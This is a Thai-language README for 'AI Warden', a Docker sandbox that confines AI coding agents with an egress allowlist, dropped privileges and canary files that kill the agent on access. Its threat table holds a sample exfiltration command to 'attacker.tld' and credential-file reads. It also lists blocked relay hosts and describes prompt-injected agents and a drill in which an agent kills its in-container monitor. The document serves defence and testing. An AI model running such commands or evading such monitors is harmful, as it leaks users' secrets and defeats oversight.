# AI Warden

> **Zero-Trust OS-level isolation sandbox สำหรับ AI coding agent**
> รัน Claude Code, Aider, Codex CLI, Hermes และ Cursor Dev Container ได้อย่างปลอดภัย
> โดยที่ agent เข้าไม่ถึงเครื่องโฮสต์ ส่งข้อมูลออกนอกไม่ได้ และขยับด้านข้างไม่ได้

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
![Platform](https://img.shields.io/badge/platform-Docker%20%7C%20Linux%20%7C%20WSL2%20%7C%20macOS-blue)

---

## ปัญหาที่ AI Warden แก้

AI coding agent สมัยนี้รันคำสั่ง shell เอง แก้ไฟล์เอง และต่อเน็ตเองได้ทั้งหมด
ถ้า agent โดน prompt injection จากไฟล์ใน repo, จาก issue บน GitHub, หรือจาก dependency สักตัว
สิ่งที่มันทำได้ทันทีคือ

| ภัยคุกคาม | ผลลัพธ์ถ้าไม่มี sandbox |
|---|---|
| อ่าน `~/.ssh/id_rsa`, `~/.aws/credentials` | คีย์โฮสต์รั่วทั้งเครื่อง |
| `curl -X POST https://attacker.tld -d @secrets` | ข้อมูลออกนอกแบบเงียบ ๆ |
| `sudo` / setuid escalation | ยึดเครื่องเป็น root |
| เปิด reverse shell | ผู้โจมตีเข้ามาแบบ interactive |
| `rm -rf` นอกโฟลเดอร์โปรเจกต์ | ข้อมูลนอกโปรเจกต์เสียหาย |

AI Warden ปิดทั้ง 5 ทางนี้ที่ระดับ **OS / kernel** ไม่ใช่ระดับ prompt
เพราะกฎที่เขียนใน prompt นั้น agent เลือกไม่ทำตามได้ แต่ capability ที่ถูก drop ไปแล้วนั้นเรียกคืนไม่ได้

---

## สถาปัตยกรรม

```
                              internet
                                  |
                       [ warden_external ]  ← bridge ปกติ
                                  |
                    +---------------------------+
                    |   warden-egress-proxy     |  squid, DENY ALL by default
                    |   allowlist เท่านั้น        |  ทุก request ถูก log ไว้
                    +---------------------------+
                                  |
                     [ warden_internal ]  ← internal: true → ไม่มี route ออกเน็ต
                                  |
        +-------------------------+-------------------------+
        |                                                   |
+---------------------------+                 +---------------------------+
|  warden-agent-sandbox     |                 |  warden-canary-sentinel   |
|  uid 1001 (ai_user)       |   PID namespace |  CAP_KILL อย่างเดียว        |
|  --cap-drop=ALL           |<--------------->|  ไม่มี network เลย          |
|  no-new-privileges        |     ร่วมกัน      |  rootfs read-only          |
|  mount แค่ /workspace     |                 |  ฆ่า agent เมื่อ canary ถูกแตะ |
+---------------------------+                 +---------------------------+
```

**หัวใจของงานนี้อยู่ที่บรรทัดเดียวใน `docker-compose.yml`:**

```yaml
networks:
  warden_internal:
    internal: true      # Docker ไม่ติดตั้ง gateway route ให้ network นี้
```

เมื่อ network เป็น `internal` ตัว container ของ agent **เปิด socket ออกอินเทอร์เน็ตไม่ได้เลยในระดับ kernel**
ไม่ใช่แค่ "ถูกบล็อกด้วย firewall rule" — มันไม่มีเส้นทางให้เดินตั้งแต่แรก
ทางออกเดียวคือ proxy ซึ่งปฏิเสธทุกอย่างที่ไม่อยู่ใน allowlist

---

## เริ่มใช้งานใน 4 คำสั่ง

```bash
git clone https://github.com/mntoyg/AI-Warden.git
cd AI-Warden
./scripts/setup-host.sh          # ตรวจ prerequisite, สร้าง .env และ network
```

```bash
make build                        # build image ทั้ง agent และ egress proxy (~3-4 GB)
```

```bash
make up                           # เปิด egress filter
```

```bash
./scripts/verify-isolation.sh     # พิสูจน์ว่า isolation ใช้งานได้จริง
```

จากนั้นรัน agent:

```bash
./scripts/warden-cli.sh run ./my-project claude
```

หรือผ่าน `make`:

```bash
make run-claude WS=./my-project
```

---

## ใส่ API key อย่างปลอดภัย

```bash
cp .env.example .env
chmod 600 .env
```

แก้ `.env` ใส่คีย์ที่ต้องใช้ แล้ว AI Warden จะส่งให้ container ตอน runtime เท่านั้น

**key ไม่เคยถูก bake เข้า image ไม่เคยขึ้นใน `ps` และไม่เคยอยู่ใน shell history**
เพราะ `warden-cli.sh` ส่งด้วย `docker run -e NAME` (ไม่มี `=value`)
ซึ่ง docker client จะไปอ่านค่าจาก environment ของ shell ที่เรียกเอง — ค่าจริงไม่เคยผ่าน argv

ถ้าชอบ export ใน shell ก็ได้เหมือนกัน:

```bash
export ANTHROPIC_API_KEY="sk-ant-..."
./scripts/warden-cli.sh run ./my-project claude
```

---

## คำสั่งทั้งหมด

| คำสั่ง | ทำอะไร |
|---|---|
| `warden-cli.sh build` | build image agent + egress proxy |
| `warden-cli.sh up` / `down` | เปิด / ปิด egress filter และ network |
| `warden-cli.sh run <folder> [agent]` | รัน agent โดย mount แค่ `<folder>` |
| `warden-cli.sh exec <container>` | เข้าไปใน sandbox ที่รันอยู่ |
| `warden-cli.sh status` | ดูสถานะ proxy / sandbox / incident |
| `warden-cli.sh logs proxy` | ดู audit trail ของ egress ทุก request |
| `warden-cli.sh allowlist add <domain>` | เพิ่มโดเมนใน allowlist |
| `warden-cli.sh verify` | รันชุดทดสอบ isolation ทั้งหมด |
| `warden-cli.sh doctor` | ตรวจ prerequisite ของโฮสต์ |

`agent` ที่รองรับ: `claude` | `aider` | `codex` | `hermes` | `bash`

ส่ง argument ต่อให้ agent ได้ด้วย `--`:

```bash
./scripts/warden-cli.sh run ./my-api aider -- --model sonnet --no-auto-commits
```

---

## สิ่งที่รับประกัน 5 ข้อ

### 1. Host Isolation — โฮสต์มองไม่เห็น

mount เฉพาะโฟลเดอร์ที่ระบุไปที่ `/workspace` เท่านั้น
`$HOME`, `~/.ssh`, `~/.aws`, `/etc` ของโฮสต์ และ Docker socket ไม่มีอยู่ในมุมมองของ container

`assert_safe_mount()` ใน `warden-cli.sh` จะปฏิเสธการ mount ที่อันตรายตั้งแต่ต้น:
root ของ filesystem, ไดรฟ์ทั้งลูก, `$HOME` ทั้งก้อน, และตัว AI Warden เอง
ถ้าโฟลเดอร์ที่จะ mount มี `.ssh` / `.aws` / `.kube` / `.gnupg` อยู่ข้างใน มันจะถามยืนยันก่อน

### 2. Privilege Containment — ไม่มีทางยกสิทธิ์

```
uid 1001 (ai_user)   ·  password ถูก lock  ·  ไม่ได้ติดตั้ง sudo เลย
--cap-drop=ALL       ·  CapBnd = 0000000000000000
--security-opt no-new-privileges  ·  setuid/setgid bit ถูกลบออกจาก image ทั้งหมด
```

การลบ setuid bit ทั้งอิมเมจ (`su`, `mount`, `chsh`, `newgrp`, `ping`) บวกกับ `no_new_privs`
ทำให้ช่องทาง local privilege escalation หายไปทั้งหมด ไม่ใช่แค่ยากขึ้น

> **หมายเหตุทางเทคนิค:** `CapEff` ของ process ที่ไม่ใช่ root จะเป็น 0 อยู่แล้ว
> แม้ container จะยัง**ไม่ได้** drop capability เลยก็ตาม
> AI Warden จึงตรวจ **`CapBnd`** (bounding set) ซึ่งเป็นค่าที่ `--cap-drop=ALL` เคลียร์จริง ๆ
> ถ้าตรวจแค่ `CapEff` จะได้ผลลัพธ์ "ปลอดภัย" แบบหลอก ๆ

### 3. Egress Filtering — ออกได้เฉพาะที่อนุญาต

policy เริ่มต้นคือ **DENY ALL** โดเมนที่อนุญาตอยู่ใน
[`core/network/whitelist_domains.txt`](core/network/whitelist_domains.txt)

```
api.anthropic.com      api.openai.com        .perplexity.ai
github.com             .githubusercontent.com
registry.npmjs.org     pypi.org              files.pythonhosted.org
```

นอกจาก allowlist แล้ว proxy ยังบล็อกอีก 4 ชั้น เพื่อไม่ให้เลี่ยง allowlist ได้:

- **IP ตรง ๆ** — `https://1.1.1.1/` ถูกปฏิเสธ (`dstdom_regex` จับ IP literal ทั้ง v4/v6 และเลขฐานสิบล้วน)
- **ปลายทาง private / link-local / metadata** — `169.254.169.254`, `10.0.0.0/8`, `metadata.google.internal` ปิดหมด กัน lateral movement และ cloud credential theft
- **พอร์ตที่ไม่ใช่ 80/443** — `CONNECT github.com:22` ถูกปฏิเสธ ปิดทาง SSH tunnel
- **relay ยอดนิยม** — `ngrok`, `webhook.site`, `pastebin`, `transfer.sh` ไม่อยู่ใน allowlist และ `allowlist add` ก็ปฏิเสธที่จะเพิ่มให้

**AI Warden จงใจไม่ทำ SSL-bump** — ถ้า bump ต้องติดตั้ง CA ของ warden ลงใน sandbox
และ proxy จะเห็น API key ของคุณเป็น cleartext ทุกตัว
การกรองที่ระดับ CONNECT host บังคับได้ว่า "คุยกับใครได้บ้าง" โดยไม่ต้องรู้ว่า "คุยว่าอะไร"

ทุก request ทั้งที่ผ่านและถูกปฏิเสธถูก log ไว้:

```bash
make logs
```

### 4. Honeypot Canary — กับดักที่ฆ่า container ทันที

ตอน container เริ่มทำงาน entrypoint จะวางไฟล์ล่อไว้:

```
/workspace/.secrets/credentials      <- named volume (ext4) บังคับใช้ได้ทุกแพลตฟอร์ม
/workspace/.secrets/id_rsa           <- named volume (ext4) บังคับใช้ได้ทุกแพลตฟอร์ม
/workspace/.secrets.canary           <- bind mount, ดูหัวข้อ "ข้อเท็จจริงเรื่องแพลตฟอร์ม"
/workspace/secrets.json              <- bind mount
/workspace/.env.vault                <- bind mount
/home/ai_user/.aws/credentials       <- overlayfs, บังคับใช้ได้เสมอ
/home/ai_user/.ssh/id_rsa_backup     <- overlayfs, บังคับใช้ได้เสมอ
```

ไฟล์เหล่านี้ถูกใส่ไว้เป็นบรรทัดแรกของ `.aiignore` และไฟล์ ignore ของทุกเครื่องมือ
agent ที่ประพฤติดีจึงถูกบอกอย่างชัดเจนแล้วว่าอย่าแตะ
**การเปิดอ่านไฟล์พวกนี้จึงไม่ใช่อุบัติเหตุ แต่เป็นหลักฐานของพฤติกรรมที่ผิด**

เมื่อมีการ `open()` เกิดขึ้น:

```
[SECURITY BREACH] Canary file accessed by Agent Process!
[SECURITY BREACH] file=/workspace/secrets.json event=OPEN mode=inline
[SECURITY BREACH] suspect pid=42 uid=1001 exe=/usr/bin/cat cmd='cat secrets.json'
[SECURITY BREACH] SIGKILL delivered to 3 process(es)
```

container จบด้วย **exit code 99** และเขียนรายงาน forensic ลง
`<workspace>/WARDEN_SECURITY_INCIDENT.json`

#### ข้อเท็จจริงเรื่องแพลตฟอร์ม — และเหตุผลที่ AI Warden พูดตรง ๆ เรื่องนี้

`inotify_add_watch` **สำเร็จ** บน filesystem ที่ไม่เคยส่ง event ออกมาเลยสักตัว
กรณีที่เจอจริงคือ bind mount ของ Docker Desktop บน Windows/macOS ซึ่งเป็น 9p หรือ virtiofs
(`/workspace 9p rw,noatime,...`) — `noatime` ยังตัดทางเลือกสำรองอย่างการดู atime ไปด้วย

tripwire ที่รายงานว่า "armed" ทั้งที่มองไม่เห็นอะไรเลย อันตรายกว่าไม่มี tripwire
AI Warden จึง **วัดความสามารถจริง** ตอน arm ด้วยไฟล์ probe ชั่วคราว (ไม่ใช่ canary จริง —
เพราะการอ่าน canary จะไปทริกเกอร์ monitor ตัวอื่นที่เฝ้าไฟล์เดียวกันอยู่คนละ container)
แล้วรายงานผลตามจริง:

```
[canary] watchable  : /workspace/.secrets (ext4)   - inotify delivers events
[canary] *** DEGRADED : /workspace (9p) does NOT deliver inotify events.
                        Canaries on this path CANNOT be enforced.
[canary] watchable  : /home/ai_user/.aws (overlay) - inotify delivers events
[canary] v1.0.0 mode=inline action=kill enforced=4/7
[canary] *** 3 canary path(s) are NOT enforced on this host: ...
```

ทางแก้คือ mount **named volume ไว้ที่ `/workspace/.secrets`** — อยู่บน ext4 จริงในตัว VM
ทำให้ส่ง inotify event ได้ตามปกติ canary ที่นั่นจึงบังคับใช้ได้ทุกแพลตฟอร์ม

**ทำไมต้องเป็น named volume ไม่ใช่ tmpfs** — tmpfs แก้ปัญหา inotify ได้ก็จริง
แต่มันเป็นของ **mount namespace เดียว** แปลว่า `warden-canary-sentinel` ที่อยู่คนละ container
จะมองไม่เห็นเลย → ชั้น anti-tamper ทั้งชั้นตายสนิทบน Docker Desktop
named volume ให้ **inode ชุดเดียวกัน** กับทั้งสอง container และ inotify เฝ้าที่ inode
การอ่านของ agent จึงปลุก watcher ในฝั่ง sentinel ได้

ส่วน canary ที่อยู่ใน bind mount ตรง ๆ ยังคงไว้เป็นชั้นเสริม และ**ทำงานเต็มที่บน Linux ที่รัน Docker ตรง**

> **หมายเหตุเรื่องสิทธิ์:** vault เป็น `0770` เจ้าของ `1001:1001` และ sentinel เข้าร่วมกลุ่ม 1001
> ด้วย `--group-add` เพราะ root ที่ถูก `--cap-drop=ALL` **ไม่มี `CAP_DAC_OVERRIDE`**
> จึงไม่ได้สิทธิ์ข้าม permission ใด ๆ เลย และ `inotify_add_watch()` ต้องการสิทธิ์อ่านไฟล์
> การใช้ group permission ธรรมดาคือคำตอบที่ least-privilege กว่าการแจก `CAP_DAC_READ_SEARCH`
> ซึ่งจะทำให้ sentinel อ่านได้ทุกไฟล์ใน container ตัวเอง

> **ทำไมไม่ใช้ `watchdog` อย่างเดียว**
> การ *อ่าน* ไฟล์ทำให้เกิด `IN_OPEN` / `IN_ACCESS` แต่ inotify emitter ของ `watchdog`
> subscribe แค่ create / modify / delete / move เท่านั้น
> แปลว่า `cat secrets.json` ธรรมดา ๆ **`watchdog` มองไม่เห็น**
> AI Warden จึงเรียก `inotify(7)` ตรง ๆ ผ่าน `ctypes` และใช้ `watchdog` เป็นตัวสำรองเท่านั้น
>
> ทางที่ดีกว่าคือ `fanotify` เพราะระบุ process ที่เปิดไฟล์ได้แม่นยำ
> แต่มันต้องการ `CAP_SYS_ADMIN` ซึ่ง sandbox นี้จงใจไม่มี — เราจึงสืบย้อนจาก `/proc` แทน

**สองชั้นป้องกัน:** ถ้า agent ฉลาดพอจะฆ่า monitor ที่อยู่ใน container เดียวกัน (uid เดียวกันจึงฆ่าได้)
ยังมี `warden-canary-sentinel` เป็น container แยก ไม่มี network เลย rootfs เป็น read-only
มี capability เดียวคือ `CAP_KILL` และแชร์ PID namespace กับ sandbox
agent ส่งสัญญาณหามันไม่ได้ ptrace ก็ไม่ได้ แต่มันฆ่า agent ได้

ทดสอบสถานการณ์นี้จริงแล้ว — agent ฆ่า monitor ตัวใน container สำเร็จ
เหลือแต่ของ sentinel ที่ฆ่าไม่ได้ (`pkill: Operation not permitted`)
พออ่าน canary ต่อ sentinel จับได้และฆ่า agent ทิ้ง:

```
monitors still alive: 1   (the survivor is the sentinel's, running as root)
[canary] *** [SECURITY BREACH] file=/workspace/.secrets/credentials event=OPEN mode=sentinel
[canary] *** [SECURITY BREACH] SIGKILL delivered to 1 process(es): [91]
agent container is GONE - killed by the sentinel
```

> **ทำไม sentinel ต้องรันเป็น uid 0**
> การฆ่า process ของ user อื่นต้องมี `CAP_KILL` อยู่ใน **effective set**
> แต่ `--cap-add` ของ Docker ใส่ให้แค่ *bounding set* เท่านั้น
> process ที่ไม่ใช่ root จึงเริ่มด้วย effective set ว่างเปล่า และยกขึ้นมาไม่ได้
> (`no-new-privileges` ปิดทาง file capability ไว้แล้ว)
> sentinel ที่รันเป็น uid 1002 จะเห็น breach แล้วได้ `EPERM` พอดี
> จึงรันเป็น root ที่ถือ capability เดียวในระบบทั้งหมด ไม่มี network
> และไม่มี mount อะไรนอกจาก workspace — agent (uid 1001, ไม่มี capability เลย)
> ยังคงแตะมันไม่ได้อยู่ดี

### 5. Universal Compatibility

- **Terminal agents:** `claude`, `aider`, `codex`, `hermes` ติดตั้งมาให้พร้อมใน image
- **Cursor / VS Code:** copy [`devcontainer/devcontainer.json`](devcontainer/devcontainer.json)
  ไปไว้ที่ `.devcontainer/` ของโปรเจกต์ แล้วสั่ง "Reopen in Container"
  terminal, extension และ agent ของ Cursor เองจะอยู่ในกรงเดียวกันทั้งหมด
- **ไฟล์ ignore ครบทุกเครื่องมือ:** `.aiignore` เป็นต้นฉบับ แล้ว mirror ไปเป็น
  `.claudeignore`, `.cursorignore`, `.aiderignore`, `.hermesignore`, `.cometignore`, `.codexignore`
  (`make sync-ignores` เพื่อ regenerate)

---

## พิสูจน์ว่ามันทำงานจริง

อย่าเชื่อ README — รันชุดทดสอบ:

```bash
./scripts/verify-isolation.sh
```

ชุดทดสอบมี 3 เฟส:

| เฟส | ทดสอบอะไร | ผลที่ต้องได้ |
|---|---|---|
| **A** | self-test ในมุมมองของ agent เอง: uid, `CapBnd`, `no_new_privs`, ตาราง mount, ยิง TCP ตรงออกเน็ต, allowlist allow/deny, IP-literal CONNECT, CONNECT พอร์ต 22, relay exfiltration, canary armed | ผ่านทุกข้อ |
| **B** | breach drill จริง — container อ่าน canary โดยตั้งใจ | container ตายด้วย **exit 99** |
| **C** | fail-closed drill — สั่งรันโดย **ไม่มี** `--cap-drop=ALL` | entrypoint ปฏิเสธ **exit 78** |

อยากลองด้วยมือก็ได้:

```bash
./scripts/warden-cli.sh run ./workspaces/default bash
```

```bash
# ในกรง — ทุกคำสั่งนี้ต้อง "ล้มเหลว"
curl --noproxy '*' https://1.1.1.1        # ไม่มี route ออก
curl https://example.com                   # ไม่อยู่ใน allowlist → 403
cat /etc/shadow                            # permission denied
ls ~/.ssh/id_rsa                           # ไม่มีคีย์จริงในนี้
cat secrets.json                           # ← container ตายทันที exit 99
```

รายละเอียดเต็มอยู่ใน [`docs/VERIFICATION.md`](docs/VERIFICATION.md)

---

## ข้อจำกัดที่ต้องรู้ (พูดตรง ๆ)

AI Warden ยกระดับความปลอดภัยได้จริง แต่ไม่ใช่เวทมนตร์ สิ่งที่มัน **ไม่ได้** ป้องกันคือ:

1. **Container escape ระดับ kernel** — sandbox นี้ใช้ namespace ของ Linux
   ถ้ามีช่องโหว่ใน kernel หรือ runtime ที่หลุดออกจาก namespace ได้ AI Warden ก็หยุดไม่ได้
   ถ้าต้องการชั้นนี้ด้วย ให้ใช้ gVisor (`--runtime=runsc`) หรือ Kata Containers
   และรัน Docker แบบ rootless เพื่อให้การหลุดออกมาไม่ได้ root ของโฮสต์ทันที

2. **การรั่วผ่านช่องทางที่อนุญาต** — ถ้า agent มีสิทธิ์คุยกับ `api.anthropic.com` ได้
   มันก็ส่งซอร์สโค้ดของคุณไปในนั้นได้ allowlist ควบคุมได้แค่ "คุยกับใคร" ไม่ใช่ "คุยว่าอะไร"
   (จะควบคุมเนื้อหาต้อง SSL-bump ซึ่งแลกมาด้วยการเปิด API key ให้ proxy เห็นหมด)

3. **โค้ดที่ agent เขียนแล้วคุณเอาไปรันบนโฮสต์** — กรงคุ้มครองแค่ตอนที่ agent รันอยู่ข้างใน
   `git diff` ก่อน merge เสมอ

4. **In-container monitor ถูกฆ่าได้** — monitor ตัวใน container รันด้วย uid เดียวกับ agent
   agent จึงฆ่ามันได้ นี่คือเหตุผลที่ต้องมี `warden-canary-sentinel` แยกออกมา
   อย่าปิดมันด้วย `WARDEN_SENTINEL=0` เว้นแต่รู้ว่ากำลังทำอะไรอยู่

5. **inotify บน bind mount ของ Docker Desktop** — บน Windows/macOS การเปลี่ยนไฟล์
   จากฝั่งโฮสต์อาจไม่ propagate เป็น inotify event ใน container
   แต่การเข้าถึงจาก **ในคอนเทนเนอร์** (ซึ่งเป็นสิ่งที่เราสนใจ) ทำงานปกติเสมอ

อ่านการวิเคราะห์เต็มที่ [`docs/THREAT_MODEL.md`](docs/THREAT_MODEL.md)

---

## โครงสร้างโปรเจกต์

```
ai-warden/
├── .aiignore                    # ต้นฉบับ deny-list สำหรับ AI ทุกตัว
├── .claudeignore .cursorignore .aiderignore
├── .hermesignore .cometignore .codexignore     # mirror ของ .aiignore
├── Makefile                     # ทางลัดทุกคำสั่ง
├── docker-compose.yml           # topology + network internal
├── core/
│   ├── Dockerfile               # image agent ที่ hardened แล้ว
│   ├── entrypoint.sh            # posture check, seed canary, fail-closed
│   └── network/
│       ├── Dockerfile           # image ของ squid
│       ├── proxy-entrypoint.sh  # validate ruleset ก่อนรับ traffic
│       ├── squid.conf           # DENY ALL + allowlist + anti-bypass
│       └── whitelist_domains.txt
├── monitors/
│   └── canary_monitor.py        # inotify tripwire (inline / sentinel)
├── scripts/
│   ├── warden-cli.sh            # CLI หลักฝั่งโฮสต์
│   ├── setup-host.sh            # ตรวจ prerequisite + setup
│   ├── verify-isolation.sh      # ชุดทดสอบ 3 เฟส
│   └── selftest-in-container.sh # assertion ที่รันในกรง
├── devcontainer/
│   └── devcontainer.json        # Cursor / VS Code
├── docs/
│   ├── THREAT_MODEL.md
│   └── VERIFICATION.md
└── workspaces/
    └── default/                 # โปรเจกต์ที่จะ mount เข้า sandbox
```

---

## แนวทางที่แนะนำ

- **หนึ่ง sandbox ต่อหนึ่งโปรเจกต์** อย่า mount โฟลเดอร์แม่ที่มีหลายโปรเจกต์
- **ใช้ token ที่แคบที่สุด** — GitHub fine-grained PAT ที่จำกัดแค่ repo เดียว
- **ตรวจ allowlist เหมือนตรวจ firewall rule** ทุกโดเมนที่เพิ่มคือการขยาย blast radius
- **อ่าน `make logs` เป็นระยะ** นั่นคือ audit trail เดียวที่บอกว่า agent คุยกับใครไปบ้าง
- **เจอ exit 99 เมื่อไหร่ ให้ถือว่า session นั้นเป็นศัตรู** — rotate key ทุกตัวที่เคยส่งเข้าไป
- **ใช้ rootless Docker ถ้าทำได้** เพื่อให้ container escape ไม่ได้ root ของโฮสต์

---

## License

MIT — ดู [LICENSE](LICENSE)
